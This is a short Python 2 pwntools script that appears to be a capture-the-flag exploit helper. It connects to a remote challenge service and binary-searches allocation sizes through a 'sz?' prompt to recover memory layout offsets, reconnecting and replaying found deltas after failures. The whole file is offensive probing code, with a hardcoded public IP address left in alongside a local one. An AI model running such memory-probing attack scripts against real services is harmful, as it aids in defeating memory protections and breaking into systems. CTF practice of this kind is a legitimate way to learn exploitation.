from pwn import *
import traceback

HOST, PORT = '54.202.7.144', 6969
HOST, PORT = '0.0.0.0', 31337
r = remote(HOST, PORT)

deltas = []
mid = 1
while mid > 0:
	end = (1 << (64 - 12 - 13))
	start = 0
	while start <= end:
		try:
			mid = (start + end) / 2
			r.send('a' * 0x64 + str(mid * 0x1000))
			r.recvuntil('sz? ')
			result = r.recvn(4, timeout=2)
			print result
			if result == 'FAIL':
				end = mid - 1
				if start > end:
					mid -= 1
					r.send('a' * 0x64 + str(mid * 0x1000))
					r.recvuntil('sz? ')
					result = r.recvn(4, timeout=2)
					assert result == 'free'
					break
			elif result == 'free' or result == '':
				start = mid + 1
				if start > end:
					break
				r.send('y')
			else:
				raise 1
			print hex(start * 0x1000), hex(end * 0x1000)
		except:
			traceback.print_exc()
			r.close()
			r = remote(HOST, PORT)
			for delta in deltas:
				r.send('a' * 0x64 + str(delta).ljust(0x64) + 'a' * 0x64)
				r.recvuntil('sz? ')
				assert r.recvn(4) == 'free'
			continue
	deltas.append(mid * 0x1000)
	print map(hex, deltas)
	r.send('x' * 100)

print map(hex, deltas)
for delta in deltas:
	print hex(delta)